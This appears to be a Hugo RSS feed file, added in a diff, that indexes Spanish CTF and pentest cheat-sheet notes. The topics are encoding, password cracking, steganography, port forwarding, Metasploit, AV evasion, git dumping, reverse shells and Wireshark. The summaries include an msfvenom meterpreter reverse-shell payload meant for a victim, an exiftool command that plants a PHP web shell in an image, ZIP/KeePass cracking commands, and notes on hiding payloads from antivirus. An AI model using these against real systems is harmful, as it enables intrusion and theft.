@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hacking Genérico on GlmbXecurity</title>
+    <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/</link>
+    <description>Recent content in Hacking Genérico on GlmbXecurity</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="http://localhost:1313/docs/2---hacking-gen%C3%A9rico/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/codificaci%C3%B3n/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/codificaci%C3%B3n/</guid>
+      <description>Encode / decode en base64&#xD;#&#xD;echo &amp;#39;lo que sea en texto plano&amp;#39; | base64 echo &amp;#39;lo que sea en base64&amp;#39; | base64 -d Crack hash md5&#xD;#&#xD;https://crackstation.net&#xA;0ok language&#xD;#&#xD;Hay un lenguaje con este aspecto: &amp;ldquo;Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. &amp;quot;&#xA;Se puede decodificar aquí: https://www.dcode.fr/ook-language&#xA;Brainfuck&#xD;#&#xD;Teniendo un código de este tipo: ++++++++++[&amp;gt;+++++++&amp;gt;++++++++++&amp;gt;+++&amp;gt;+&amp;laquo;&amp;laquo;-]&amp;gt;++.&amp;gt;+.+++++++..+++.&amp;gt;++.&amp;laquo;+++++++++++++++.&amp;gt;.+++.&amp;mdash;&amp;mdash;.&amp;mdash;&amp;mdash;&amp;ndash;.&amp;gt;+.&amp;gt;.&#xA;se puede decodificar aquí: https://www.dcode.fr/brainfuck-language</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/cracking-fuerza-bruta/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/cracking-fuerza-bruta/</guid>
+      <description>IMPORTANTE AL USAR JOHN&#xD;#&#xD;Al crackear hashes a veces no nos muestra en la salida del programa la clave, para verla basta con ejecutar:&#xA;john --show &amp;lt;nombre_del_fichero_crackeado&amp;gt; #EJEMPLO john --show hash Cracking ZIP&#xD;#&#xD;Con FcrackZIP&#xD;#&#xD;fcrackzip -v -u -D -p &amp;lt;diccionario&amp;gt; &amp;lt;fichero.zip&amp;gt; Con John the ripper&#xD;#&#xD;# Primero extraemos el hash del zip zip2john fichero.zip &amp;gt; hash_del_zip # Segundo ataque de fuerza bruta contra ese hash john --wordlist=&amp;lt;diccionario&amp;gt; hash_del_zip Cracking Keepass database&#xD;#&#xD;Con john the ripper&#xD;#&#xD;# Convertimos la database.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/esteganograf%C3%ADa/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/esteganograf%C3%ADa/</guid>
+      <description>&#xD;Strings&#xD;#&#xD;El comando strings sirve para mostrar cadenas de texto legíbles, ocultas dentro de ficheros binarios que a priori no son legibles, como una imagen. En ocasiones, la máquina nos dirige hacia una imagen o fichero que en principio no parece ser nada, pero que igual oculta algún mensaje importante.&#xA;strings &amp;lt;ichero&amp;gt; </description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/local-port-forwarding/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/local-port-forwarding/</guid>
+      <description>How to&#xD;#&#xD;Cuando tenemos acceso a una máquina, hay servicios que por algun motivo solo están corriendo para el &amp;ldquo;localhost&amp;rdquo;. A veces nos interesa acceder a ese servicio ya que puede ser un panel web de administración, por ejemplo.&#xA;Supongamos una máquina que corre un servicio web en el puerto 9999 y lo queremos ver desde nuestro equipo en el puerto 8080.&#xA;ssh usuario@ip -L 8080:localhost:9999 # -L especifica redirección de puertos y funciona así # local_port:remote_host:remote_port Ahora basta con dirigirnos al navegador web de nuestra máquina atacante y dirigirnos a la URL http://localhost:8080</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/metasploit-y-msfvenom/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/metasploit-y-msfvenom/</guid>
+      <description>Metasploit basics&#xD;#&#xD;* msfconsole (abrir metasploit) * search &amp;lt;CVE-****&amp;gt; (buscar exploits) * search &amp;lt;windows | nombre de la vuln ..&amp;gt; * use &amp;lt;modulo&amp;gt; (utilizar un exploit) * show options (para ver lo que podemos aplicar en un exploit) * set (establecer un parámetro) * run (lanzar un exploit) * shell (obtener una shell cuando ya hemos establecido una sesión de meterpreter) * sessions -l (listar sesiones) * sessions -K (kill sessions) * sessions &amp;lt;numero&amp;gt; entrar en una sesión #METERPRETER migrar sesion de meterpreter x86 a x64 pgrep explorer (esto nos dará el PID del proceso explorer) migrate &amp;lt;numero&amp;gt; (el numero del proceso obtenido) #METERPRETER BASICS * sysinfo * getprivs * getuid * Payloads con MsfVenom&#xD;#&#xD;Payload sesión meterpreter Windows&#xD;#&#xD;#Generamos el payload y lo compartimos con la víctima msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&amp;lt;ip_atacante&amp;gt; LPORT=443 -f exe -o fichero.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/obfuscation---av-evasion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/obfuscation---av-evasion/</guid>
+      <description>Exiftool&#xD;#&#xD;Incluir PHP en imagen&#xD;#&#xD;Lo primero que necesitamos es la imagen que vamos a utilizar para cargar la Shell. Una vez descargada, comenzamos a modificarla.&#xA;El comando para ello es:&#xA;exiftool -Comment=&amp;#39;&amp;lt;?php echo “&amp;lt;pre&amp;gt;”; system($_GET[‘cmd’]); ?&amp;gt;’ nombre_imagen.extensión Alternate data streams ADS (Para windows)&#xD;#&#xD;Con ADS podemos esconder ficheros en metadatos de otros ficheros para tratar de evadir un antivirus o pasar desapercibido.&#xA;Teniendo un fichero payload.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/repositorio-git/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/repositorio-git/</guid>
+      <description>En algunas webs, nos podemos encontrar al realizar el reconocimiento, que nmap nos reporta la existencia de un repositorio de git. y además nos indica la ruta.&#xA;Dumpear repositorio git&#xD;#&#xD;En este momento, podemos dumpear el repositorio a nuestra máquina con herramientas como git-dumptool. Hay muchas de este tipo.&#xA;Analizar la información&#xD;#&#xD;con git log, podemos ver los comits. con git show, seguido de los primeros digitos del commit, podemos ver los cambios en el código.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/reverse-shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/reverse-shells/</guid>
+      <description>Técnicas para una reverse shell&#xD;#&#xD;Consideraciones&#xD;#&#xD;En ocasiones el PUERTO puede determinar que funcione o no **Si no funciona, probar a cambiar el tipo de comillas &amp;quot;&amp;quot; &amp;rsquo;&amp;rsquo; ** Si metemos la reverse shell en la URL, mejor URLencodear el comando. Si metemos la reverse shell a través de un comando con un exploit en el terminal, poner el comando entre comillas Reverse shell en la URL con BASH&#xD;#&#xD;Si tenemos ejecución remota de comandos a través de una URL, podemos establecer una reverse shell con bash.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/wireshark/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/2---hacking-gen%C3%A9rico/wireshark/</guid>
+      <description>En esta página se llevarán a cabo las distintas técnicas que se pueden utilizar para sacarle partido a wireshark en el entorno de la ciberseguridad.&#xA;Encontrar capturas de wireshark&#xD;#&#xD;find / -name *.pcap* 2&amp;gt;/dev/null Contraseñas con wireshark&#xD;#&#xD;Puede darse el caso de que se haya establecido una conexión, una shell, reverse shell, hacia la máquina, y se podría mirar el historial de comandos. Caso muy útil porque podriamos descubirir contraseñas, o ficheros interesantes.</description>
+    </item>
+  </channel>
+</rss>
